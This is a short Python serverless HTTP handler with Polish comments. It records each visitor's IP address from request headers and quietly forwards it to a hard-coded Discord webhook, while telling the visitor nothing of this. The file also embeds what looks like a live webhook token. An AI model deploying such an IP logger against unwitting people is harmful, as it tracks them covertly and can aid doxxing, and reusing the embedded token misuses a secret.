import json
import urllib.request

WEBHOOK_URL = "https://discord.com/api/webhooks/1418597405871439933/8YsY9-WYZfq19AHicu8ua8ZPWgVxS1_I-4CiQ-LtZLS5HtzPfHOW8dpBwdrh84Pm80NR"  # np. Discord webhook URL

from http.server import BaseHTTPRequestHandler

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Pobranie IP
        ip = self.headers.get('x-forwarded-for') or \
             self.headers.get('x-vercel-forwarded-for') or \
             self.headers.get('x-real-ip') or \
             self.client_address[0]

        if ip and ',' in ip:
            ip = ip.split(',')[0].strip()

        # Wysłanie IP na webhook
        data = json.dumps({"content": f"Nowe IP: {ip}"}).encode('utf-8')
        req = urllib.request.Request(WEBHOOK_URL, data=data, headers={'Content-Type': 'application/json'})
        try:
            urllib.request.urlopen(req)
        except Exception as e:
            print("Błąd wysyłki webhook:", e)

        # Odpowiedź dla klienta
        payload = {"ip": ip}
        body = json.dumps(payload).encode('utf-8')

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(body)))
        self.end_headers()
        self.wfile.write(body)
